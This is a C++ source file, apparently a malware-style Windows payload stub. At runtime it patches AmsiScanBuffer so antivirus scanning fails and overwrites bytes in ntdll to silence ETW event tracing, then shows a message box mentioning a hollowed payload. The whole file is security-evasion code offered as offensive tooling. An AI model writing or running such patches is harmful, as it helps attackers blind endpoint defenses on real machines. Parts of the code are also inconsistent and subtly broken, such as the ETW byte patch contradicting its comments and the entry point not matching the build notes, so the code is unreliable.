// language: C++, file: stub.cpp, target: Windows 11, MSVC
// Payload stub — compiles to payload.bin. Built with /ENTRY:mainCRTStartup,
// /NODEFAULTLIB, /ALIGN:16, /MERGE:.rdata=.text, /EMITPOGOPHOTOINFO
// Contains its own AMSI + ETW patch, then drops a message box.
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "kernel32.lib")

// AMSI bypass — patch loaded at runtime in the stub itself
static void PatchAmsi() {
    HMODULE h = LoadLibraryW(L"amsi.dll");
    if (!h) return;
    BYTE* p = (BYTE*)GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return;
    DWORD old;
    VirtualProtect(p, 6, PAGE_EXECUTE_READWRITE, &old);
    p[0] = 0xB8; p[1] = 0x57; p[2] = 0x00; p[3] = 0x07; p[4] = 0x80; // mov eax,0x80070057
    p[5] = 0xC3;                                                          // ret
    VirtualProtect(p, 6, old, &old);
}

// ETW patch — nop the EtwEventWrite hook so tracing sinks get silence
static void PatchEtw() {
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    if (!h) return;
    // pattern: 4C 89 4C 24 20 4C 89 44 24 18 ... C3 — write mov eax,eax (NOP) over 2 bytes
    BYTE* base = (BYTE*)h;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE* va = base + sec->VirtualAddress;
        SIZE_T size = sec->Misc.VirtualSize;
        for (SIZE_T k = 0; k + 16 < size; k++) {
            // signature: 4C 89 4C 24 20 4C 89 44 24 18 (mov [rsp+20],r9 ; mov [rsp+18],r8)
            if (va[k] == 0x4C && va[k+1] == 0x89 && va[k+2] == 0x4C && va[k+3] == 0x24 && va[k+4] == 0x20 &&
                va[k+5] == 0x4C && va[k+6] == 0x89 && va[k+7] == 0x44 && va[k+8] == 0x24 && va[k+9] == 0x18) {
                DWORD old; VirtualProtect(va + k, 2, PAGE_EXECUTE_READWRITE, &old);
                va[k] = 0x48; va[k+1] = 0x89; // mov rax,rax (NOP2)
                VirtualProtect(va + k, 2, old, &old);
                return;
            }
        }
    }
}

void EntryPoint() {
    PatchAmsi();
    PatchEtw();
    MessageBoxW(nullptr, L"payload läuft — hollow übernommen", L"FLAGGG", MB_OK);
    ExitProcess(0);
}
